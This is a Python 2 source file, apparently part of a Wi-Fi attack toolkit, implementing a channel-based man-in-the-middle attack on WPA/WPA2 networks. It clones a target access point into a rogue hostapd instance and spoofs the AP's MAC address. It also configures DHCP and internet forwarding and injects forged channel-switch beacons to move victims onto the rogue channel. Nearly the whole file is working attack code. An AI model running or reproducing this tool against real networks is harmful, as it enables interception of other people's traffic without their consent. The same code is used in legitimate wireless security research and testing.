#!/usr/bin/env python2

import imp
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import struct, time, subprocess, textwrap, argparse, atexit, sys
from .wpaspy import Ctrl
from .packet_processing import *
from .log_messages import *
# from fakeAP import *
#import fakeAP

def print_rx(level, name, p, color=None, suffix=None):
	'''
	Module: mitm_code
	===

	Description: prints the packets received on terminal

	Arguments:
	  level: ALL, DEBUG, INFO, STATUS, WARNING, ERROR
	  name: descriptive name
	  p: 802.11 packet received
	
	Format of the output:
	  "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix)
	'''
	if p[Dot11].type == 1: return
	if color is None and (Dot11Deauth in p or Dot11Disas in p): color="orange"
	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)


class MitmChannelBased():
	'''
    Module: mitm_code
    ===

	Description: Obtain the configuration of the target network, clone to a Rogue AP, configure interfaces and start a new instance of `hostapd` to obtain the MitM Channel Based
	'''
	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, nic_ether, ssid, clientmac=None, dumpfile=None):
		
		#Varibles to get the target network configurations
		self.beacon = None
		self.ssid = ssid
		self.apmac = None
		self.real_channel = None
		self.group_cipher = None
		self.wpavers = 0
		self.pairwise_ciphers = set()
		self.akms = set()
		self.wmmenabled = 0
		self.capab = 0
		
		#Variables to configure interfaces and sockets (nic_rogue_mon is optional)
		self.nic_real_clientack = None
		self.nic_real = nic_real
		self.nic_rogue_ap = nic_rogue_ap
		self.nic_rogue_mon = nic_rogue_mon
		self.nic_ether = nic_ether
		self.sock_real = None
		self.sock_rogue = None
		
		#Variables to initiate a new rogue hostapd instance
		self.hostapd = None
		self.hostapd_log = None

		#Variables to get optional arguments from command line
		self.dumpfile = dumpfile
		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()

	def is_wparsn(self):
		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Description: verifies if the target network is WPA or WPA2 protected
		'''
		return not self.group_cipher is None and self.wpavers > 0 and \
			len(self.pairwise_ciphers) > 0 and len(self.akms) > 0

	def __parse_wparsn(self, wparsn):

		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Description: obtains information about network security configurations

		Informations obtained:
		  group_cipher
		  pairwise_ciphers
		  akms (auth key managment)
		  RSN capabilites
		'''
		self.group_cipher = ord(wparsn[5])

		num_pairwise = struct.unpack("<H", wparsn[6:8])[0]
		pos = wparsn[8:]
		for i in range(num_pairwise):
			self.pairwise_ciphers.add(ord(pos[3]))
			pos = pos[4:]

		num_akm = struct.unpack("<H", pos[:2])[0]
		pos = pos[2:]
		for i in range(num_akm):
			self.akms.add(ord(pos[3]))
			pos = pos[4:]

		if len(pos) >= 2:
			self.capab = struct.unpack("<H", pos[:2])[0]

	def from_beacon(self, p):
		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Description: obtains a beacon packet from the target network and extracts information from that to clone the Rogue AP

		Arguments:
		  p: 802.11 Beacon packet
		
		Informations extracted:
		  self.ssid = SSID
		  self.real_channel = Channel
		  self.wpavers = WPA 1 or WPA 2
		  self.group_cipher = Group Cipher
		  self.pairwise_ciphers = Pairwise Ciphers
		  self.akms = Auth Key Management (akm)
		  self.capab = RSN Capabilities
		  self.wmm enabled = WMM enabled(1) or disabled(0)
		'''
		el = p[Dot11Elt]
		while isinstance(el, Dot11Elt):
			if el.ID == IEEE_TLV_TYPE_SSID:
				self.ssid = el.info
			elif el.ID == IEEE_TLV_TYPE_CHANNEL:
				self.real_channel = ord(el.info[0])
			elif el.ID == IEEE_TLV_TYPE_RSN:
				self.__parse_wparsn(el.info)
				self.wpavers |= 2
			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x01":
				self.__parse_wparsn(el.info[4:])
				self.wpavers |= 1
			elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x02":
				self.wmmenabled = 1

			el = el.payload

	def find_rogue_channel(self):
		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Description: find a new channel for Rogue AP operate

		Rules:
		  if real_channel >= 6, rogue_channel = 1
		  else rogue_channel = 11
		'''
		self.rogue_channel = 1 if self.real_channel >= 6 else 11

	def __write_config(self, iface):
		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Description: write the configuration file for `hostapd_rogue.conf`

		Arguments:
		  iface: interface on which the Rogue AP will operate
		'''
		TEMPLATE = """ctrl_interface=hostapd_ctrl
ctrl_interface_group=0

interface={iface}
ssid={ssid}
channel={channel}

wpa={wpaver}
wpa_key_mgmt={akms}
wpa_pairwise={pairwise}
rsn_pairwise={pairwise}

wmm_enabled={wmmenabled}
hw_mode=g
auth_algs=3
wpa_passphrase=XXXXXXXX"""
		akm2str = {2: "WPA-PSK", 1: "WPA-EAP"}
		ciphers2str = {2: "TKIP", 4: "CCMP"}
		return TEMPLATE.format(
			iface = iface,
			ssid = self.ssid,
			channel = self.rogue_channel,
			wpaver = self.wpavers,
			akms = " ".join([akm2str[idx] for idx in self.akms]),
			pairwise = " ".join([ciphers2str[idx] for idx in self.pairwise_ciphers]),
			ptksa_counters = (self.capab & 0b001100) >> 2,
			gtksa_counters = (self.capab & 0b110000) >> 4,
			wmmadvertised = 0,
			wmmenabled = self.wmmenabled)
	
	def __write_dnsmasq(self, iface):
		TEMPLATE = """no-resolv
interface={iface}
dhcp-range=192.168.0.10,192.168.0.200,8h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=1.1.1.1
server=1.0.0.1
log-queries
log-dhcp"""
		return TEMPLATE.format(
			iface = iface
		)

	def create_dnsmasq(self):
		with open("dnsmasq.conf", "w") as fp:
			fp.write(self.__write_dnsmasq(self.nic_rogue_ap))

	def create_sockets(self, strict_echo_test=False):
		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Configure the sockets on monitor interfaces:
		  self.nic_real: self.sock_real
		  self.nic_rogue_mon: self.sock_rogue
		'''
		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real     , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)

	def find_beacon(self, ssid):
		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Description: search for a beacon sent by the target network. First, it searchs on the current channel, if it doesn't found, it starts to search on the other channels.

		Arguments:
		  SSID - the name of the target network

		When a beacon is found, some actions occur:
		  the actual_channel gets the channel set in the beacon
		  the sock_real is set to the actual_channel
		  the beacon is stored in the self.beacon variable
		  the source address is stored in the self.apmac variable
		'''
		ps = sniff(count=1, timeout=0.3, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
		if ps is None or len(ps) < 1:
			log(STATUS, "Searching for target network on other channels")
			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
				self.sock_real.set_channel(chan)
				log(DEBUG, "Listening on channel %d" % chan)
				ps = sniff(count=1, timeout=0.3, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
				if ps and len(ps) >= 1: break

		if ps and len(ps) >= 1:
			actual_chan = ord(get_tlv_value(ps[0], IEEE_TLV_TYPE_CHANNEL))
			self.sock_real.set_channel(actual_chan)
			self.beacon = ps[0]
			self.apmac = self.beacon.addr2
	
		if self.beacon is None:
			log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
			exit(1)

	def configure_interfaces(self):

		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Description: configure NIC interfaces to work with MitM Attack

		Interfaces Configured:
		  Real Channel
		    self.nic_real - type monitor
		    self.nic_real + "sta1" - type managed
		  
		  Rogue Channel
		    self.nic_rogue_ap - type managed
		    self.nic_rogue_ap + "mon" - type monior
		'''
		# 0. Warn about common mistakes
		log(STATUS, "Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script")
		# This happens when targetting a specific client: both interfaces will ACK frames from each other due to the capture
		# effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
		log(STATUS, "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")

		# 1. Remove unused virtual interfaces
		#subprocess.call(["iw", self.nic_real + "sta1", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
		if self.nic_rogue_mon is None:
			subprocess.call(["iw", self.nic_rogue_ap + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["ifconfig", self.nic_real, "down"])
		subprocess.check_output(["iw", self.nic_real, "set", "type", "monitor"])
		if self.nic_rogue_mon is None:
			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "monitor"])
			# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
			# sequence of commands to assure the virtual interface is registered as a 802.11 monitor interface.
			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
			time.sleep(0.2)
			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])
			subprocess.check_output(["iw", self.nic_rogue_mon, "set", "type", "monitor"])
			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])


		# 3. Configure interface on real channel to ACK frames
		#if self.clientmac:
				#self.nic_real_clientack = self.nic_real + "sta1"
				#subprocess.check_output(["iw", self.nic_real, "interface", "add", self.nic_real_clientack, "type", "managed"])
				#call_macchanger(self.nic_real_clientack, self.clientmac)
		#else:
			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
			#log(WARNING, "WARNING: Targeting ALL clients is not fully supported! Please provide a specific target using --target.")
			# Sleep for a second to make this warning very explicit
			#time.sleep(1)

		# 4. Finally put the interfaces up
		subprocess.check_output(["ifconfig", self.nic_real, "up"])
		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])

	def send_csa_beacon(self, numbeacons=1, newchannel=1, target=None, silent=False, rogue_channel=False):
		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Description: it sends `numbeacons` pairs of csa_beacon packets on the network. It takes the beacon sent by the target network and append the CSA element to it. The packet is sent througth the Real Socket.

		Arguments:
		  numbeacons: number of pairs of csa_beacons to send
		  target: specify a client MAC Address, if necessary
		  silent: if True, the log message is not displayed
		  newchannel: channel to switch
		'''

		beacon = self.beacon.copy()
		if target: beacon.addr1 = target

		for i in range(numbeacons):
			# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
			# followed by one with a value of 1. When starting with 1 it errors out.
			csabeacon = append_csa(beacon, newchannel, 2)
			if rogue_channel: self.sock_rogue.send(csabeacon)
			else: self.sock_real.send(csabeacon)

			csabeacon = append_csa(beacon, newchannel, 1)
			if rogue_channel: self.sock_rogue.send(csabeacon)
			else: self.sock_real.send(csabeacon)

		if not silent: log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numbeacons, newchannel), color="green")


	def init_hostapd(self):
		'''
		Module: mitm_code
		===
		Class: MitmChannelBased
		---
		Description: initiate a `hostapd` instance on `nic_rogue_ap` interface
		'''
		with open("hostapd_rogue.conf", "w") as fp:
			fp.write(self.__write_config(self.nic_rogue_ap))
		#self.hostapd = subprocess.Popen(["../hostapd/hostapd", "hostapd_rogue.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		#command = 'sudo gnome-terminal -- sh -c "../hostapd/hostapd hostapd_rogue.conf -dd -K;"$SHELL'
		
		command = "./hostapd/hostapd hostapd_rogue.conf -dd -K;"
		#command = 'sudo python3 fakeAP.py ' + self.nic_rogue_ap + ' ' + str(1) + ' ' + "ens33" + ' ' + "wlan0mon" + ';'
		# os.system(command)
		self.hostapd = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		#stdout, stderr = self.hostapd.communicate()

		# self.hostapd = os.system(command)
		self.hostapd_log = open("hostapd_rogue.log", "w")
		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
		time.sleep(2)
		
		self.hostapd_ctrl = Ctrl("hostapd_ctrl/" + self.nic_rogue_ap)
		self.hostapd_ctrl.attach()
	
	def run(self, strict_echo_test=False):
		
		self.configure_interfaces()
		self.create_sockets(strict_echo_test)

		# Test monitor mode and get MAC address of the network
		self.find_beacon(self.ssid)
		
		# Parse beacon and used this to generate a cloned hostapd.conf
		self.from_beacon(self.beacon)
		if not self.is_wparsn():
			log(ERROR, "Target network is not an encrypted WPA or WPA2 network, exiting.")
			return
		elif self.real_channel > 13:
			log(WARNING, "Attack not yet tested against 5 GHz networks.")
		self.find_rogue_channel()

		log(STATUS, "Target network %s detected on channel %d" % (self.apmac, self.real_channel), color="green")
		log(STATUS, "Will create rogue AP on channel %d" % self.rogue_channel, color="green")

		# Set the MAC address of the rogue hostapd AP
		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
		set_mac_address(self.nic_rogue_ap, self.apmac)

		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
		#if self.nic_real_clientack: subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])

		# Set BFP filters to increase performance
		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
		if self.clientmac:
			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
		bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
		self.sock_real.attach_filter(bpf)
		self.sock_rogue.attach_filter(bpf)

		# Enable Internet Access and Rogue AP
		self.create_dnsmasq()
		subprocess.Popen(["./enable_internet_forwarding.sh", self.nic_ether, self.nic_rogue_ap], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		self.init_hostapd()

		# Inject some CSA beacons to push victims to our channel
		self.send_csa_beacon(numbeacons=4, newchannel=self.rogue_channel, target=self.clientmac)